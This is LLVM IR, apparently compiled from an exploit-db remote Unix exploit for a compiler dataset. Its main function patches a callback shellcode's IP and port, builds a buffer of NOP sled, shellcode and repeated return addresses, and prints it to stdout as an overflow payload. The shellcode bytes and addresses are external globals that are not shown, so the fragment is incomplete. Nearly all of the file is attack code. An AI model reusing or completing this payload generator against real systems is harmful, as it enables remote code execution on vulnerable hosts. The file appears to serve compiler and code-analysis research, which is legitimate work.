; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_25624.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_25624.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@IP = common dso_local global i32 0, align 4
@cb = common dso_local global i8* null, align 8
@PORT = common dso_local global i32 0, align 4
@PORT_OFFSET = common dso_local global i32 0, align 4
@POE = common dso_local global i32 0, align 4
@addys = common dso_local global i64 0, align 8
@ADDY = common dso_local global i64 0, align 8
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [416 x i8], align 16
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %5 = load i32, i32* @IP, align 4
  %6 = call i32 @changeip(i32 %5)
  %7 = load i8*, i8** @cb, align 8
  %8 = load i32, i32* @PORT, align 4
  %9 = load i32, i32* @PORT_OFFSET, align 4
  %10 = call i32 @changeport(i8* %7, i32 %8, i32 %9)
  store i32 0, i32* %3, align 4
  br label %11

11:                                               ; preds = %19, %0
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 200
  br i1 %13, label %14, label %22

14:                                               ; preds = %11
  %15 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %16 = load i32, i32* %3, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 -112, i8* %18, align 1
  br label %19

19:                                               ; preds = %14
  %20 = load i32, i32* %3, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %3, align 4
  br label %11

22:                                               ; preds = %11
  store i32 0, i32* %4, align 4
  br label %23

23:                                               ; preds = %40, %22
  %24 = load i8*, i8** @cb, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  %29 = icmp ne i8 %28, 0
  br i1 %29, label %30, label %45

30:                                               ; preds = %23
  %31 = load i8*, i8** @cb, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %37 = load i32, i32* %3, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  store i8 %35, i8* %39, align 1
  br label %40

40:                                               ; preds = %30
  %41 = load i32, i32* %3, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %3, align 4
  %43 = load i32, i32* %4, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %4, align 4
  br label %23

45:                                               ; preds = %23
  br label %46

46:                                               ; preds = %60, %45
  %47 = load i32, i32* %3, align 4
  %48 = add nsw i32 %47, 4
  %49 = load i32, i32* @POE, align 4
  %50 = icmp sle i32 %48, %49
  br i1 %50, label %51, label %63

51:                                               ; preds = %46
  %52 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %53 = load i32, i32* %3, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i64, i64* @addys, align 8
  %57 = load i64, i64* @ADDY, align 8
  %58 = add nsw i64 %56, %57
  %59 = call i32 @memcpy(i8* %55, i64 %58, i32 4)
  br label %60

60:                                               ; preds = %51
  %61 = load i32, i32* %3, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* %3, align 4
  br label %46

63:                                               ; preds = %46
  %64 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %65 = load i32, i32* %3, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  store i8 0, i8* %67, align 1
  %68 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %69 = getelementptr inbounds [416 x i8], [416 x i8]* %2, i64 0, i64 0
  %70 = call i32 @strlen(i8* %69)
  %71 = load i32, i32* @stdout, align 4
  %72 = call i32 @fwrite(i8* %68, i32 %70, i32 1, i32 %71)
  ret i32 0
}

declare dso_local i32 @changeip(i32) #1

declare dso_local i32 @changeport(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i64, i32) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
